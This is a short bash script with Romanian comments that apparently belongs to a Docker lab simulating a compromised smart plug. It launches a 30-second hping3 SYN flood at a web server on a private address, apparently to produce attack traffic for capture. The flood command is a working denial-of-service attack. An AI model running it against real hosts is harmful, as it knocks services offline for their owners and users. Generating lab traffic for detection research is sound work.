#!/usr/bin/env bash
echo "[ATTACK] smart_plug compromis — DDoS SYN flood pe web_server..."

# SYN flood: trimite pachete SYN raw fără să completeze handshake-ul
# Aici funcționează hping3 pentru că suntem DIRECT în rețeaua Docker
# (spre deosebire de atacul din Kali care trecea prin socat)
# --flood = trimite cât de repede poate
# -S = setează flag-ul SYN
# -p 80 = portul destinație (web_server nginx)
hping3 -S --flood -p 80 172.20.0.3 &
HPING_PID=$!

# Durează 30 secunde — suficient pentru 2-3 ferestre de captură
sleep 30
kill $HPING_PID 2>/dev/null || true

echo "[ATTACK] DDoS terminat."